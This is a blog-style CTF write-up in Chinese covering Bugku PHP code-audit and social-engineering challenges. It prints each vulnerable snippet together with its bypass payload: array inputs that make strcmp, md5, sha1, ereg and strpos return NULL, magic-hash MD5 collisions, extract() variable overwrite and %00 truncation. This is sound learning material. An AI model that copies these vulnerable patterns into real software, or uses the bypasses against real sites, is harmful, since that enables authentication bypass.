title: bugku的代码审计和社工
author: Qianye
abbrlink: ecb3eea4
tags:
  - ctf
categories:
  - ctf
date: 2018-03-08 19:40:00
---
都做过了，在做一遍，刷理一下思绪。
<!-- more -->
[php函数漏洞详细总结](http://blog.csdn.net/qq_31481187/article/details/60968595)
# extract变量覆盖
```bash
<?php
$flag='xxx';
extract($_GET);
if(isset($shiyan))
{
$content=trim(file_get_contents($flag));
if($shiyan==$content)
{
echo'flag{xxx}';
}
else
{
echo'Oh.no';
}
}
?>
```
[变量覆盖漏洞](http://www.freebuf.com/column/150731.html)</br>
构造
```bash
?shiyan&content=
```

# strcmp比较字符串
```
<?php$flag = "flag{xxxxx}";
if (isset($_GET['a'])) 
	{ if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写）
    die('Flag: '.$flag); 
   else print 'No';}?>
```
[strcmp漏洞php5.3之前](http://blog.csdn.net/cherrie007/article/details/77473817)</br>
构造
```bash
?a[]
```
# urldecode二次编码绕过
```bash
<?php
if(eregi("hackerDJ",$_GET[id])) {
echo("

not allowed!

");
exit();
}
$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
echo "
Access granted!

";
echo "
flag

";
}
?>
```
对hackDJ进行url编码两次即可
# MD5函数
```bash
<?php
error_reporting(0);
$flag = 'flag{test}';
if (isset($_GET['username']) and isset($_GET['password'])) {
if ($_GET['username'] == $_GET['password'])
print 'Your password can not be your username.';
else if (md5($_GET['username']) === md5($_GET['password']))
die('Flag: '.$flag);
else
print 'Invalid password';
}
?>
```
[md5函数引起的问题](https://www.cnblogs.com/weidiao/p/6821812.html)</br>
一开始用?username=240610708&password=!1793422703!不成功，以为是题目错了。后来利用php的md5()函数有一个缺陷（MD5是不能处理数组的，md5(数组)会返回null），这里是===，只能用数组处理，构造payload: ?username[]=123&password[]=12
# 数组返回NULL绕过
```bash
<?php
$flag = "flag";

if (isset ($_GET['password'])) {
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
echo 'You password must be alphanumeric';
else if (strpos ($_GET['password'], '--') !== FALSE)
die('Flag: ' . $flag);
else
echo 'Invalid password';
}
?>
```
ereg遇到数组会返回null,null!==FALSE也不===FALSE
payload</br>
password[]
# sha()函数比较绕过
```bash

<?php
$flag = "flag";
if (isset($_GET['name']) and isset($_GET['password']))
{
var_dump($_GET['name']);
echo "
";
var_dump($_GET['password']);
var_dump(sha1($_GET['name']));
var_dump(sha1($_GET['password']));
if ($_GET['name'] == $_GET['password'])
echo '

Your password can not be your name!

';
else if (sha1($_GET['name']) === sha1($_GET['password']))
die('Flag: '.$flag);
else
echo '
Invalid password.

';
}
else
echo '
Login first!

';
?>

```
利用了sha1函数处理数组返回null. 
```bash
payload: ?name[]=1&password[]=3
```
# md5加密相等绕过
```bash
<?php
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
echo "flag{*}";
} else {
echo "false!!!";
}}
else{echo "please input a";}
?>
```
构造payload:
```bash
?a=240610708
```
# 十六进制与数字比较
```bash
<?php
error_reporting(0);
function noother_says_correct($temp)
{
$flag = 'flag{test}';
$one = ord('1'); //ord — 返回字符的 ASCII 码值
$nine = ord('9'); //ord — 返回字符的 ASCII 码值
$number = '3735929054';
// Check all the input characters!
for ($i = 0; $i < strlen($number); $i++)
{
// Disallow all the digits!
$digit = ord($temp{$i});
if ( ($digit >= $one) && ($digit <= $nine) )
{
// Aha, digit not allowed!
return "flase";
}
}
if($number == $temp)
return $flag;
}
$temp = $_GET['password'];
echo noother_says_correct($temp);
?>
```
换一种进制
```bash
?password=0xdeadc0de
```
# ereg正则%00截断
```bash
<?php
$flag = "xxx";
if (isset ($_GET['password']))
{
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
{
echo '

You password must be alphanumeric

';
}
else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
{
if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置
{
die('Flag: ' . $flag);
}
else
{
echo('
- have not been found

');
}
}
else
{
echo '
Invalid password

';
}
}
?>
```
ereg存在%00截断漏洞，所以构造截断 绕过第一个条件，第二个条件长度要小于8值要大于999999，所以用科学计数法绕过，又要包含-，所以payload: ?1e9%00-
页面返回*-*没有发现，果断把payload换成
```bash
?le9%00*-*
```
# strpos数组绕过
```bash
<?php
$flag = "flag";
if (isset ($_GET['ctf'])) {
if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)
echo '必须输入数字才行';
else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)
die('Flag: '.$flag);
else
echo '骚年，继续努力吧啊~';
}
?>
```
构造
```bash
 ?ctf[]
````
或者
```bash
?ctf=1%00%23biubiubiu
```
# 密码
张三名字的第一个字母和生日组合
# 信息查找
通过百度查找bugku.cn 就能找到一条主机屋网站遭到黑客攻击，黑客爆出联系方式。里面的群qq就是
# 简单的个人信息收集
zip压缩包，猜测伪加密，在winhex中打开，找到504B0102从50算起，的第九和第十个字节全部都改成00。成功得到一些信息。然后去社工吧。
#